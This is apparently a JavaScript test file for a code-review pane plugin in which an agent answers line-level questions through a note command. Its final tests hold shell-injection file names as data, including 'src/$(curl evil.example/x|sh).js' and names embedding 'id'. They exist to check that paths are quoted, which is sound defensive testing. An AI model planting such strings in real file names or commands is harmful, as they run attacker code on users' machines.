"use strict";

// What an agent has to say about a line, and the way in for it.
//
// The plugin has always sent one way. This is the other half: a question goes out
// with the command to answer it, the answer lands in a file, the watch notices, and
// it appears beside the line it is about.

const test = require("node:test");
const assert = require("node:assert");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const { execFileSync, spawnSync } = require("node:child_process");

const { createState, reduce, toScreenModel } = require("../lib/app-state");
const {
  MAX_NOTES,
  MAX_NOTE_LENGTH,
  addNote,
  loadNotes,
  noteLines,
  saveNotes,
} = require("../lib/notes");
const { formatBatch } = require("../lib/comments");
const { noteCommandPath, replyCommand, shellQuote } = require("../lib/state/views/ask");
const { fingerprint } = require("../lib/watch");

const COLUMNS = 120;
const VIEWPORT = 20;
const NOTE_CLI = path.join(__dirname, "..", "bin", "note.js");

function makeRepo(t) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "herdr-deep-code-reading-notes-"));
  t.after(() => fs.rmSync(root, { recursive: true, force: true }));

  execFileSync("git", ["init", "-q"], { cwd: root, stdio: "ignore" });
  fs.writeFileSync(path.join(root, "a.js"), "one\ntwo\nthree\n");
  execFileSync("git", ["add", "-A"], { cwd: root, stdio: "ignore" });
  execFileSync(
    "git",
    ["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "init"],
    { cwd: root, stdio: "ignore" }
  );
  fs.writeFileSync(path.join(root, "a.js"), "ONE\nTWO\nTHREE\n");

  return { root, notes: path.join(root, ".notes.json") };
}

function press(state, keys) {
  return keys.reduce((current, key) => reduce(current, key, VIEWPORT), state);
}

/** Run the command an agent would be handed. */
function runNoteCli(args) {
  return spawnSync(process.execPath, [NOTE_CLI, ...args], { encoding: "utf8" });
}

// --- the store ---------------------------------------------------------------------

test("a note is a line, some text, and who said it", (t) => {
  const { root, notes } = makeRepo(t);
  saveNotes(notes, root, addNote([], { path: "a.js", line: 2, text: "a loop", from: "claude" }));

  assert.deepStrictEqual(loadNotes(notes, root), [
    { path: "a.js", line: 2, text: "a loop", from: "claude" },
  ]);
});

test("anything that is not a note is left out rather than refused", (t) => {
  // The file is written by something else, so it may hold anything at all
  const { root, notes } = makeRepo(t);
  fs.writeFileSync(
    notes,
    JSON.stringify({ [root]: [{ path: "a.js", line: 1, text: "kept" }, { nonsense: true }, 7] })
  );

  assert.deepStrictEqual(loadNotes(notes, root).map((note) => note.text), ["kept"]);
});

test("two answers about one file are two notes, not one", () => {
  const twice = addNote(addNote([], { path: "a.js", line: 1, text: "first" }), {
    path: "a.js",
    line: 1,
    text: "second",
  });

  assert.strictEqual(twice.length, 2);
});

test("an agent told to annotate everything cannot fill the pane forever", () => {
  let notes = [];
  for (let at = 0; at < MAX_NOTES + 10; at += 1) {
    notes = addNote(notes, { path: "a.js", line: at + 1, text: `note ${at}` });
  }

  assert.strictEqual(notes.length, MAX_NOTES);
  assert.strictEqual(notes[notes.length - 1].text, `note ${MAX_NOTES + 9}`);
});

test("which lines of a file carry one", () => {
  const notes = [
    { path: "a.js", line: 2, text: "x" },
    { path: "a.js", line: 5, text: "y" },
    { path: "b.js", line: 9, text: "z" },
  ];

  assert.deepStrictEqual([...noteLines(notes, "a.js")].sort(), [2, 5]);
  assert.deepStrictEqual([...noteLines(notes, "c.js")], []);
});

// --- the way in ------------------------------------------------------------------------

test("the command writes a note where the pane will find it", (t) => {
  const { root, notes } = makeRepo(t);

  const result = runNoteCli([
    "--store", notes, "--repo", root, "--file", "a.js", "--line", "2",
    "--from", "claude", "the", "loop", "runs", "twice",
  ]);

  assert.strictEqual(result.status, 0, result.stderr);
  assert.deepStrictEqual(loadNotes(notes, root), [
    { path: "a.js", line: 2, text: "the loop runs twice", from: "claude" },
  ]);
});

test("the text does not have to be quoted", (t) => {
  // Which is the thing a shell command written by a language model gets right least
  // reliably, so it is the thing this does not need
  const { root, notes } = makeRepo(t);

  runNoteCli(["--store", notes, "--repo", root, "--file", "a.js", "--line", "1", "a", "b", "c"]);

  assert.strictEqual(loadNotes(notes, root)[0].text, "a b c");
});

test("a longer answer arrives on stdin, which is what a paragraph needs", (t) => {
  // An answer worth reading is often several lines — what a class is for, when a
  // branch is taken — and a command line is one line by nature
  const { root, notes } = makeRepo(t);

  const result = spawnSync(
    process.execPath,
    [NOTE_CLI, "--store", notes, "--repo", root, "--file", "a.js", "--line", "2", "-"],
    { encoding: "utf8", input: "what it does\n\nand when it does it\n" }
  );

  assert.strictEqual(result.status, 0, result.stderr);
  assert.strictEqual(loadNotes(notes, root)[0].text, "what it does\n\nand when it does it");
});

test("nothing on stdin is refused rather than written", (t) => {
  const { root, notes } = makeRepo(t);

  const result = spawnSync(
    process.execPath,
    [NOTE_CLI, "--store", notes, "--repo", root, "--file", "a.js", "--line", "2", "-"],
    { encoding: "utf8", input: "" }
  );

  assert.notStrictEqual(result.status, 0);
  assert.deepStrictEqual(loadNotes(notes, root), []);
});

test("an answer longer than the store keeps is cut rather than dropped", () => {
  // The file is written by something else. An agent told to explain a module could
  // write a page of it, and a note nobody can see because it was refused is worse
  // than one that ends in an ellipsis.
  const [note] = addNote([], { path: "a.js", line: 1, text: "x".repeat(MAX_NOTE_LENGTH + 100) });

  assert.ok(note.text.length < MAX_NOTE_LENGTH + 100, "it was cut");
  assert.ok(note.text.startsWith("xxx"), "and it is the start that was kept");
  assert.match(note.text, /…$/, "which the note says rather than leaving to be noticed");
});

test("a note that fits is left exactly as it was written", () => {
  const [note] = addNote([], { path: "a.js", line: 1, text: "short enough" });

  assert.strictEqual(note.text, "short enough");
});

test("a note with nothing in it is refused rather than written", (t) => {
  const { root, notes } = makeRepo(t);

  const result = runNoteCli(["--store", notes, "--repo", root, "--file", "a.js", "--line", "1"]);

  assert.notStrictEqual(result.status, 0);
  assert.match(result.stderr, /no note/);
});

test("a line that is not a line is refused", (t) => {
  const { root, notes } = makeRepo(t);

  assert.notStrictEqual(
    runNoteCli(["--store", notes, "--repo", root, "--file", "a.js", "--line", "0", "x"]).status,
    0
  );
  assert.notStrictEqual(
    runNoteCli(["--store", notes, "--repo", root, "--line", "3", "x"]).status,
    0
  );
});

test("--clear takes them all away", (t) => {
  const { root, notes } = makeRepo(t);
  runNoteCli(["--store", notes, "--repo", root, "--file", "a.js", "--line", "1", "x"]);

  const result = runNoteCli(["--store", notes, "--repo", root, "--clear"]);

  assert.strictEqual(result.status, 0);
  assert.deepStrictEqual(loadNotes(notes, root), []);
});

test("one repository's notes are not another's", (t) => {
  const { root, notes } = makeRepo(t);
  runNoteCli(["--store", notes, "--repo", root, "--file", "a.js", "--line", "1", "mine"]);
  runNoteCli(["--store", notes, "--repo", "/elsewhere", "--file", "a.js", "--line", "1", "theirs"]);

  assert.deepStrictEqual(loadNotes(notes, root).map((note) => note.text), ["mine"]);
});

// --- the watch sees it -------------------------------------------------------------------

test("a note written while the pane is open changes the fingerprint", (t) => {
  // The notes are the one thing the watch looks at that is not in the repository, and
  // an answer sitting on disk until the reader presses r is the keystroke this saves
  const { root, notes } = makeRepo(t);
  const before = fingerprint(root, notes);

  runNoteCli(["--store", notes, "--repo", root, "--file", "a.js", "--line", "1", "hello"]);

  assert.notStrictEqual(fingerprint(root, notes), before);
});

test("a pane that knows of no notes fingerprints what it always did", (t) => {
  const { root } = makeRepo(t);

  assert.strictEqual(typeof fingerprint(root), "string");
});

// --- on the screen -------------------------------------------------------------------------

test("a noted line is marked, and the mark is not the comment's", (t) => {
  const { root, notes } = makeRepo(t);
  runNoteCli(["--store", notes, "--repo", root, "--file", "a.js", "--line", "1", "hello"]);

  const state = createState(root, "review", COLUMNS, { notesFile: notes });

  assert.deepStrictEqual([...toScreenModel(state).noteLines], [1]);
});

test("a note that arrives after the pane opened is there after a reload", (t) => {
  const { root, notes } = makeRepo(t);
  const state = createState(root, "review", COLUMNS, { notesFile: notes });
  assert.deepStrictEqual(state.notes, []);

  runNoteCli(["--store", notes, "--repo", root, "--file", "a.js", "--line", "2", "later"]);

  assert.strictEqual(reduce(state, "r", VIEWPORT).notes.length, 1);
});

// --- asking ------------------------------------------------------------------------------------

test("@ opens a field to type the question into", (t) => {
  const { root, notes } = makeRepo(t);
  const state = press(createState(root, "review", COLUMNS, { notesFile: notes }), ["j"]);

  const asking = reduce(state, "@", VIEWPORT);

  assert.strictEqual(asking.input.kind, "ask");
  assert.match(toScreenModel(asking).help, /question about these lines/);
});

test("the question carries the lines, and the command to answer with", (t) => {
  const { root, notes } = makeRepo(t);
  const state = press(createState(root, "review", COLUMNS, { notesFile: notes }), ["j", "@"]);
  const asked = press(state, "what is this for?".split(""));

  const message = formatBatch(reduce(asked, "enter", VIEWPORT).comments);

  assert.match(message, /a\.js:/);
  assert.match(message, /what is this for\?/);
  // Every path spelled out: the agent's shell is not a plugin process and has none of
  // HERDR_PLUGIN_STATE_DIR to discover them from
  assert.ok(message.includes(shellQuote(notes)), "the store is not in the command");
  assert.ok(message.includes(shellQuote(root)), "the repository is not in the command");
  assert.ok(message.includes(shellQuote(noteCommandPath())), "the command has no path");
  assert.ok(path.isAbsolute(noteCommandPath()));
});

test("the question says how to answer with more than one line", (t) => {
  const { root, notes } = makeRepo(t);
  const state = press(createState(root, "review", COLUMNS, { notesFile: notes }), ["j", "@"]);
  const asked = reduce(press(state, "why?".split("")), "enter", VIEWPORT);

  const message = formatBatch(asked.comments);

  assert.match(message, /piped in|-`? in place/, "a paragraph has no way in that it names");
});

test("a path that reads as a shell command is quoted rather than run", (t) => {
  // The whole point of the reply command is that an agent runs it, so a path is a
  // string on somebody's command line. `$(...)` and a backtick are both live inside
  // double quotes, which is what a JSON-quoted path would have given them: a file
  // named this way in a repository under review would have run on the reader's machine.
  const { root, notes } = makeRepo(t);
  const state = press(createState(root, "review", COLUMNS, { notesFile: notes }), ["j"]);
  const anchor = {
    file: "src/$(curl evil.example/x|sh).js",
    side: "new",
    start: 1,
    end: 1,
    lines: ["+ONE"],
  };

  const command = replyCommand(state, anchor);

  assert.ok(command.includes("'src/$(curl evil.example/x|sh).js'"), command);
  assert.ok(!command.includes('"src/$('), "the path is inside double quotes");
});

test("a real shell reads a quoted path back as the name that went in", (t) => {
  // Asked of /bin/sh rather than of a second implementation of the quoting: what has
  // to be true is that the shell the agent runs the command in sees one argument, and
  // nothing in these names runs.
  const { root, notes } = makeRepo(t);
  const state = press(createState(root, "review", COLUMNS, { notesFile: notes }), ["j"]);

  const names = [
    "a'; id; '.js",
    "src/$(id).js",
    "src/`id`.js",
    'src/" ; id ; ".js',
    "src/\\.js",
    "a b\t c.js",
  ];

  for (const name of names) {
    const anchor = { file: name, side: "new", start: 1, end: 1, lines: ["+ONE"] };
    const command = replyCommand(state, anchor);

    assert.ok(command.includes(shellQuote(name)), `${name} is not quoted in the command`);

    const read = execFileSync("/bin/sh", ["-c", `printf %s ${shellQuote(name)}`], {
      encoding: "utf8",
    });
    assert.strictEqual(read, name, `a shell read ${JSON.stringify(name)} as something else`);
  }
});

test("Enter keeps it for the batch rather than sending it on its own", (t) => {
  // Five things you do not understand on one page are five round trips through
  // somebody else's pane if each one goes as it is typed — see test/ask-queue
  const { root, notes } = makeRepo(t);
  const state = press(createState(root, "review", COLUMNS, { notesFile: notes }), ["j", "@"]);
  const typed = press(state, "why?".split(""));

  const asked = reduce(typed, "enter", VIEWPORT);

  assert.strictEqual(asked.effect, null);
  assert.strictEqual(asked.input, null);
  assert.strictEqual(asked.comments[0].text, "why?");
});

test("sending one turns the watch on, because the answer arrives on its own", (t) => {
  const { root, notes } = makeRepo(t);
  const state = press(createState(root, "review", COLUMNS, { notesFile: notes }), ["j", "@"]);

  const sent = press(press(state, "why?".split("")), ["enter", "S", "enter"]);

  assert.strictEqual(sent.watching, true);
});

test("an empty question is not a question", (t) => {
  const { root, notes } = makeRepo(t);
  const state = press(createState(root, "review", COLUMNS, { notesFile: notes }), ["j", "@"]);

  const away = reduce(state, "enter", VIEWPORT);

  assert.strictEqual(away.input, null);
  assert.strictEqual(away.effect, null);
});

test("a question can be a paragraph, the way a comment can", (t) => {
  const { root, notes } = makeRepo(t);
  const state = press(createState(root, "review", COLUMNS, { notesFile: notes }), ["j", "@"]);

  const twoLines = reduce(press(state, "a".split("")), "ctrl-d", VIEWPORT);

  assert.match(twoLines.input.text, /\n$/);
});

test("Esc asks nothing", (t) => {
  const { root, notes } = makeRepo(t);
  const state = press(createState(root, "review", COLUMNS, { notesFile: notes }), ["j", "@"]);

  assert.strictEqual(reduce(state, "escape", VIEWPORT).input, null);
});
